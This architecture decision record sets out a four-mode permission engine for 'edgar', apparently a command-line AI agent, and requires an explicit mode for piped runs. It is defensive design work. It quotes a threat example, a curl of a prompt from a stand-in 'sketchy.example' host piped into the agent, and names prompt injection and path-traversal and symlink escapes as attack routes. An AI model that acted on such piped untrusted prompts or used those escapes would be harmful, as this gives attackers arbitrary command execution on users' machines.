# ADR-0004 — Four-mode policy engine, explicit mode required when piped

**Status:** Accepted · 2026-09-02

## Context

edgar composes with unix pipes, which creates a problem the interactive case does
not have. When stdin is a pipe or stdout is not a TTY, there is nobody to answer
"allow this shell command?". The permission system has to define what happens.

The consequences are asymmetric and both bad:

- **Fail closed** and the tool is useless in scripts, which is half the point
- **Fail open** and `curl https://sketchy.example/prompt.txt | edgar` executes
  arbitrary commands on the user's machine

## Options

**A. Non-interactive defaults to read-only.** Safe, needs a flag to be useful.

**B. Non-interactive defaults to auto** minus a hard deny list. Convenient,
dangerous with untrusted input.

**C. Require an explicit mode.** Refuse to run at all unless the caller states
intent. Most predictable, least forgiving.

## Decision

Option C, inside a four-mode policy engine.

**Modes:** `read-only`, `ask`, `auto`, `yolo`.

**Interactive** sessions default to `ask` and remember decisions for the session.
This is the daily driver.

**Non-interactive** runs require `-p/--prompt` *and* an explicit `--mode`. Absent a
mode, exit 3 with a message naming the flag. No silent default in either direction.

**Decision precedence**, first match wins:

1. Hard deny list — never overridable
2. Explicit per-tool rule from config
3. Mode default
4. Tool's own `dangerous` flag escalates to Ask

**`yolo` is unreachable from config alone.** It requires an environment variable
plus an explicit flag with typed confirmation, because a config file can be
committed, shared, or written by another tool, and a mode that disables all safety
must not be reachable that way.

## Consequences

- `edgar -p "x"` piped without `--mode` fails loudly. This is friction, and it is
  the correct friction: it makes the caller state intent once per script
- Scheduled runs are non-interactive by definition, so every schedule entry carries
  its own mode and allowlist [SCH-8]. The two decisions reinforce each other
- Subagent policy may only **narrow** relative to the parent [PERM-8]. Nothing at
  runtime may widen it
- Path matching must defeat `..` traversal, symlink escape, Windows UNC and 8.3
  short names by resolving fully before comparison [PERM-5]. This is where
  permission systems actually get broken
- `decide()` is a **pure function** of (tool, args, mode, rules, cwd, interactive),
  which makes the whole matrix exhaustively testable with no I/O

## Rejected alternatives

**Read-only default** (A) was the initial recommendation. Overridden because
silently degrading to read-only produces confusing failures where the agent
appears to work but cannot act, and diagnosing that is worse than being told up
front.

**Auto default** (B) was rejected outright. The prompt-injection surface of a piped
untrusted prompt with full tool access is unacceptable for a tool people will run
in their home directory.
